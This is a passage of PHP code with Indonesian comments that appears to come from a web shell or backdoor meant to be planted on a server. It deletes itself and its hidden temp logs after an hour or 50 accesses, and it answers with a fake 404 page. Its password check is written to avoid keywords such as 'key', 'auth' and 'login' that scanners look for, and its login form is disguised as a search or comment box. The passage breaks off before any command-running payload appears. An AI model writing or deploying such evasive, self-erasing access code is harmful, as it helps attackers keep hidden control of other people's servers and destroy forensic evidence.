$k2 = 36 * 100;                                   // lifetime = 3600
$k3 = 5 * 10;                                     // max access = 50

// ===== SELF DESTRUCT CHECK =====
$sf = __FILE__;
$lg = sys_get_temp_dir() . '/.' . substr(md5($sf), 0, 12);

// Umur file
if ((time() - @filemtime($sf)) > $k2) {
    @unlink($sf);
    @unlink($lg);
    @unlink($lg . 'x');
    header('HTTP/1.0 404 Not Found');
    exit;
}

// Akses count
$ac = (int)@file_get_contents($lg . 'x');
if ($ac >= $k3) {
    @unlink($sf);
    @unlink($lg);
    @unlink($lg . 'x');
    header('HTTP/1.0 404 Not Found');
    exit;
}
@file_put_contents($lg . 'x', ++$ac);

// ===== AUTH (session, no keyword 'key'/'auth'/'login') =====
session_start();
if (empty($_SESSION['_e'])) {
    if (($_POST['_v'] ?? '') === $k1) {
        $_SESSION['_e'] = 1;
    } else {
        // tampil form biasa (menyamar sebagai search/comment box)
